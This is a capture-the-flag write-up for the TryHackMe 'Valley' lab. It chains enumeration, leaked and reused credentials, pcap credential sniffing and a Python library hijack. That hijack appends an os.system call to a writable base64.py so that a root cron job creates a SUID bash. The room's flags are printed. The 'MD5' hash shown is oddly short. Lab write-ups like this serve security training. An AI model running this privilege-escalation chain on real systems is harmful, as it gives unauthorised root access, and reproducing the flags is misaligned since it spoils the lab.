# Valley 

nmap scan 

```abap
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 64
80/tcp    open  http    syn-ack ttl 64
37370/tcp open  unknown syn-ack ttl 64
```

<img width="1856" height="971" alt="Screenshot From 2025-09-09 18-44-35" src="https://github.com/user-attachments/assets/7627cc91-ffb6-4a8d-8148-462f3af86904" />

Looking around I see a gallery path and a static path.  Enumerating more I can see

```abap
[23:52:34] 301 -  310B  - /gallery  ->  http://valley.thm/gallery/
[23:52:34] 301 -  309B  - /static  ->  http://valley.thm/static/
[23:52:36] 301 -  310B  - /pricing  ->  http://valley.thm/pricing/
```

We go to `/pricing` and we see  `note.txt` 

```abap
J,
Please stop leaving notes randomly on the website
-RP
```

Enumerating more we see a addition to the query `/static/00`

```abap
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

<img width="1856" height="971" alt="Screenshot From 2025-09-09 19-04-19" src="https://github.com/user-attachments/assets/1f332dc3-611d-465b-8e46-6f418fb386e7" />


Going to the `http://valley.thm/dev1243224123123/`

So I need a username and password. Enumerating more we get 2 parameters

```abap
[00:13:43] 200 -  606B  - /dev1243224123123/dev.js
[00:13:56] 200 -  852B  - /dev1243224123123/old.js
```

Looking at `dev.js` we get a username and password

```abap
loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})
```

Logging in we get 

```abap
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```

So lets ftp using port 37370. We use the same username and password

```abap
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
```

After looking around in `siemHTTP2` typing `http.request.method==POST` , then right click `Number 2335 > Follow > HTTP Stream` we get a username and password

```abap
uname=valleyDev&psw=ph0t0s1234&remember=on
```

We ssh using the credentials and boom we have the first flag 

> THM{k@l1_1n_th3_v@lley}
> 

We cant run `sudo -l` 

But we do have `valleyAuthenticator` we cant read here but possible extracting it could reveal the contents.

```abap
drwxr-xr-x  5 root      root        4096 Mar  6  2023 .
drwxr-xr-x 21 root      root        4096 Mar  6  2023 ..
drwxr-x---  4 siemDev   siemDev     4096 Mar 20  2023 siemDev
drwxr-x--- 16 valley    valley      4096 Mar 20  2023 valley
-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13  2023 valleyDev
```

So in the valley shell run `python3 -m http.server` then on your terminal run `wget http://<TARGET_IP>:8000/valleyAuthenticator`then using running `string valleyAuthenticator` we get 

```abap
IMpUc
X/bZ
&3sY
M$(T
1EEE
wcap
4a`C
pLEc
KI&A
|Xsr
RXbbE62
TIS7
H	8)u
76skipws
_Q `+
E6sxc
K@jW@n
7718
HF +
tns3
'	\)
$Pi-
IME	
p@Wp.
d-id%ABI-
.r^lL
n.f<Zov
2.eh+Y.m
gcc!C
ot	3rKH+O
.bss
0nent;
N.vA
 -\(
UPX!
UPX!
```

Something interesting showed up and its this string `e6722920bab2326f8217e4`

```abap
Hash	Type	Result
e6722920bab2326f8217e4	md5	liberty123
```

Its a password. Now trial and error let me to valley. Now we have a little more privileges we can run. Enumerating more and checking files.

```abap
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py
```

There is a file running. Lets read it.

```abap
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
	image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
	with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
	encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
	output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
	with open(output_path, "wb") as output_file:
    	  output_file.write(encoded_image_data)

```

The script import base64 library, goes to /photos and opens every jpg file from p1.jpg to p7.jpg through a loop, encodes every file with base64 and write it to /photos/photoVault.

Nothing we can do to exploit the script but the one thing that’s left is the base64 library, if it’s writable we can exploit it. Running this command we can see that base64 is writable which means we can make a shell and have it execute on the root level 

```abap
find / -type f -name 'base64.py' -ls 2>/dev/null
263097     20 -rwxrwxr-x   1 root     valleyAdmin    20382 Mar 13  2023 /usr/lib/python3.8/base64.py
```

```abap
echo 'import os; os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")' >> /usr/lib/python3.8/base64.py
```

Then after that make sure the script is ran by looking for `bash` under `/tmp`

```abap
valley@valley:~$ ls -la /tmp
total 1220
drwxrwxrwt 16 root root    4096 Sep  9 17:22 .
drwxr-xr-x 21 root root    4096 Mar  6  2023 ..
-rwsr-sr-x  1 root root 1183448 Sep  9 17:23 bash
drwxrwxrwt  2 root root    4096 Sep  9 15:40 .font-unix
drwxrwxrwt  2 root root    4096 Sep  9 15:40 .ICE-unix
drwx------  2 root root    4096 Sep  9 15:40 snap-private-tmp
drwx------  3 root root    4096 Sep  9 15:41 systemd-private-e4458d8eae1c4013a54c7b9d2a40d1c1-apache2.service-J2NlKi
drwx------  3 root root    4096 Sep  9 16:22 systemd-private-e4458d8eae1c4013a54c7b9d2a40d1c1-fwupd.service-cFeaqg
drwx------  3 root root    4096 Sep  9 15:41 systemd-private-e4458d8eae1c4013a54c7b9d2a40d1c1-ModemManager.service-r5KHug
drwx------  3 root root    4096 Sep  9 15:40 systemd-private-e4458d8eae1c4013a54c7b9d2a40d1c1-systemd-logind.service-xVmq3e
drwx------  3 root root    4096 Sep  9 15:40 systemd-private-e4458d8eae1c4013a54c7b9d2a40d1c1-systemd-resolved.service-TgMzOg
drwx------  3 root root    4096 Sep  9 15:40 systemd-private-e4458d8eae1c4013a54c7b9d2a40d1c1-systemd-timesyncd.service-w6Ma5i
drwx------  3 root root    4096 Sep  9 16:22 systemd-private-e4458d8eae1c4013a54c7b9d2a40d1c1-upower.service-ZGb2qf
drwxrwxrwt  2 root root    4096 Sep  9 15:40 .Test-unix
drwxrwxrwt  2 root root    4096 Sep  9 15:40 VMwareDnD
drwxrwxrwt  2 root root    4096 Sep  9 15:40 .X11-unix
drwxrwxrwt  2 root root    4096 Sep  9 15:40 .XIM-unix

```

Then run `/tmp/bash -p` and you should have root!

Flag 

> THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
>
